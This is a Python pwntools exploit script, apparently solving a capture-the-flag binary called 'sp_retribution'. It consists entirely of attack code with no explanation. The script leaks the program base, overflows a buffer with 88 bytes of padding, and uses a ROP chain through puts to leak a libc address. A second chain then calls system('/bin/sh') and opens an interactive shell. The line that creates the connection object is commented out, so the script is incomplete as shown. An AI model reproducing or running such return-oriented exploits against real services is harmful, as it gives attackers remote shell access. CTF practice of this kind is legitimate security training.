from pwn import *

context.binary = exe = ELF('./sp_retribution', checksec=False)
libc = ELF('./glibc/libc.so.6')


#context.log_level = 'debug'

#r = process([exe.path])
#gdb.attach(r)
#r = remote('0.0.0.0', 1234)


def send_payload(payload):
    r.recvuntil(b">> ")
    r.sendline(b"2")
    r.recvuntil(b" y = ")
    r.sendline(b"")
    
    r.recvuntil(b"(y/n): ")
    r.sendline(payload)



r.recvuntil(b">> ")
r.sendline(b"2")
r.recvuntil(b" y = ")

r.sendline(b"")

junk = r.recvuntil(b"[*] Verify new coordinates? (y/n): ")

base = junk.split(b'\n')[-2]
base = u64(base[1:].ljust(8, b"\x00")) << 16

r.success("Base: {}".format(hex(base)))

r.sendline(b"pepe")

padding = b"A"*88

ret = base + 0x0000000000000746
poprdi = base + 0x0000000000000d33

pltputs = base + exe.plt.puts
gotputs = base + exe.got.puts
mainfunc = base + exe.sym.main


payload = flat(
        padding,
        poprdi,
        gotputs,
        pltputs,
        mainfunc
        )

send_payload(payload)

r.recvuntil(b"!")
r.recvline()

libc_leak = u64(r.recvline().strip(b"\n").ljust(8, b"\x00"))
log.info("Libc leak: {}".format(hex(libc_leak)))

libc.address = libc_leak - libc.sym.puts
log.info("Libc base addr: {}".format(hex(libc.address)))

system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))

log.info("system: {}".format(hex(system)))
log.info("/bin/sh: {}".format(hex(binsh)))

payload = flat(
        padding,
        poprdi,
        binsh,
        system
        )


send_payload(payload)

r.interactive()

